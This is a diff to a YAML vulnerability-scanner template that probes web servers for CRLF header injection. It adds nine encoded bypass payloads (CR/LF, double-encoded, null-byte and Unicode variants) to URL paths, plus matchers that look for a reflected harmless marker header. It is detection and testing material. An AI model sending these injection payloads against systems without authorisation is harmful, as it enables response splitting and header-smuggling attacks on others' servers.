@@ -1,35 +1,53 @@
-id: crlf-custom-path-injection
+id: crlf-header-injection-test
 
 info:
-  name: Custom CRLF Injection Test (test:crlf;testt reflection)
+  name: CRLF Injection - Custom Header Reflection (testtheader:testt.js)
   author: grok
-  severity: medium
-  description: Tests for CRLF injection via specific encoded paths. Detects reflection of "test:crlf;testt" in any response headers.
-  tags: crlf,header-injection,generic
+  severity: high
+  description: Tests multiple CRLF/LF/CR/Null/Unicode bypass payloads for header injection. Detects new header "testtheader:testt.js".
+  tags: crlf,header-injection,smuggling
 
 http:
   - method: GET
-    path:
-      - "{{BaseURL}}//test%3Acrlf%3Btestt.js"
-      - "{{BaseURL}}/\test%3Acrlf%3Btestt.js"
-      - "{{BaseURL}}/test%3Acrlf%3Btestt.js"
-      - "{{BaseURL}}\test%3Acrlf%3Btestt.js"
+    paths:
+      - "{{BaseURL}}//{{payload}}.js"
+      - "{{BaseURL}}/\{{payload}}.js"
+      - "{{BaseURL}}/{{payload}}.js"
+      - "{{BaseURL}}\{{payload}}.js"
 
-    # Optional: Add more variations if needed
-    # - "{{BaseURL}}//test:crlf;testt.js"
-    # - "{{BaseURL}}/?param=test%3Acrlf%3Btestt.js"
+    payloads:
+      payload:
+        - "testt%0d%0atesttheader:testt"
+        - "testt%0atesttheader:testt"
+        - "testt%0dtesttheader:testt"
+        - "testt%250d%250atesttheader:testt"
+        - "testt%E5%98%8Atesttheader:testt"
+        - "testt%E5%98%8Dtesttheader:testt"
+        - "testt%E5%98%8D%E5%98%8Atesttheader:testt"
+        - "testt%09testtheader:testt"
+        - "testt%00%0d%0atesttheader:testt"
 
     stop-at-first-match: true
-    matchers-condition: or
+    matchers-condition: and
+
     matchers:
+      # 1. Look for the injected header (decoded)
       - type: regex
         part: header
         regex:
-          - "(?i)test:crlf;testt"
-        # This catches the string anywhere in headers (case-insensitive)
-      
+          - "(?i)testtheader\s*:\s*testt\.js"
+        condition: and
+
+      # 2. Negative matcher - Avoid false positives from encoded payloads still appearing
+      - type: regex
+        part: header
+        regex:
+          - "%0d|%0a|%09|%00|E5%98|%250d%250a|%E5%98%8D%E5%98%8A"
+        negate: true
+
+      # 3. Extra safety: Ensure it's a proper header line (optional but recommended)
       - type: word
         part: header
         words:
-          - "test:crlf;testt"
-        # Fallback word matcher
+          - "testtheader:"
+        condition: and
